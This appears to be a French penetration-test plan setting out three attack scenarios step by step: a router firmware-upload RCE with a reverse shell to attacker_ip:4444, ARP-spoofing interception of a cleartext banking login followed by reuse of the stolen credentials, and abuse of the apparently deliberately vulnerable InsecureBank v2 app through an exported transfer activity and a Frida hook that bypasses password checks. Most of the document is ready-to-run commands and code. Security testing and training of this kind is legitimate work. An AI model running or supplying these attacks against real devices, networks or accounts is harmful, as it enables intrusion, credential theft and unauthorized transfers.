# Phase 3 — Scénarios d'Attaque Détaillés

## Scénario 1 : CVE-2024-54126 Firmware RCE

### Prérequis
- IP routeur : 192.168.0.1 (ou découvrir via nmap)
- Credentials : admin / [password brute-forcé ou par défaut]
- Outil : curl, burp, custom script Python

### Étapes Exploitation

**Étape 1 : Reconnaissance**
```bash
nmap -p- 192.168.0.1
# Vérifier port 80/443 ouvert
curl -I http://192.168.0.1/
```

**Étape 2 : Authentification**
```bash
curl -u admin:password http://192.168.0.1/
# Récupérer les cookies/tokens
```

**Étape 3 : Créer Payload**
```bash
# Créer binaire MIPS malveillant avec reverse shell
# Exemple : shellcode ARM MIPS qui établit connexion à attacker_ip:4444
# Compiler avec mips-linux-gcc
```

**Étape 4 : Upload Firmware**
```bash
curl -u admin:password -F "filename=@malicious.bin" \
  http://192.168.0.1/cgi/softup
# Le routeur redémarre et exécute le payload
```

### Impact Prouvable
- Ping attacker_ip depuis routeur
- Reverse shell obtenu (sh/bash)
- Accès à `cat /etc/passwd`, `iptables -L`, etc.

---

## Scénario 2 : Interception HTTP + Extraction Credentials

### Prérequis
- Position MITM (réseau local ou WiFi)
- Outil : Wireshark, mitmproxy, ou tcpdump

### Étapes Exploitation

**Étape 1 : Se positionner en MITM**
```bash
# Via ARP spoofing (sur même réseau)
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
# OU setup WiFi malveillant qui route vers InsecureBank backend
```

**Étape 2 : Capturer Trafic HTTP**
```bash
tcpdump -i eth0 -A 'port 8080'
# Ou via mitmproxy
mitmproxy -p 8080
```

**Étape 3 : Extraire Credentials**
POST /login HTTP/1.1
Host: 10.0.0.5:8080
Content-Type: application/x-www-form-urlencoded
username=john_doe&password=MyBankPassword123

**Étape 4 : Login avec Credentials Volés**
- Utiliser les credentials pour accéder à l'app depuis autre appareil
- Effectuer transferts, voir soldes, etc.

### Impact Prouvable
- Capture d'écran du trafic HTTP montrant credentials
- Accès à compte utilisateur depuis autre appareil

---

## Scénario 3 : Activités Exportées + Transfert Non-Autorisé

### Prérequis
- APK InsecureBank v2 installé
- Outil : Android Studio, Frida, ou app malveillante custom

### Étapes Exploitation (Via Activités Exportées)

**Étape 1 : Créer Intent pour DoTransfer**
```java
Intent transferIntent = new Intent();
transferIntent.setComponent(new ComponentName(
  "com.android.insecurebankv2",
  "com.android.insecurebankv2.DoTransfer"
));
transferIntent.putExtra("account", "attacker_account");
transferIntent.putExtra("amount", "1000");
startActivity(transferIntent);
```

**Étape 2 : Effectuer Transfert Sans Authentification**
- L'activité DoTransfer s'ouvre directement
- Pas d'authentification requise (exportée)
- Transfert exécuté

### Étapes Exploitation (Via Debuggable + Frida)

**Étape 1 : Attacher Frida**
```bash
frida -U -f com.android.insecurebankv2
```

**Étape 2 : Hook Authentification**
```javascript
Java.perform(function () {
  var DoLogin = Java.use("com.android.insecurebankv2.DoLogin");
  DoLogin.validatePassword.overload('java.lang.String').implementation = function(password) {
    return true; // Toujours valider
  };
});
```

**Étape 3 : Effectuer Transfert avec Privilèges Élevés**

### Impact Prouvable
- Transfert effectué sans MFA
- Logs Frida montrant le hook
- Screenshot de l'activité lancée sans authentification

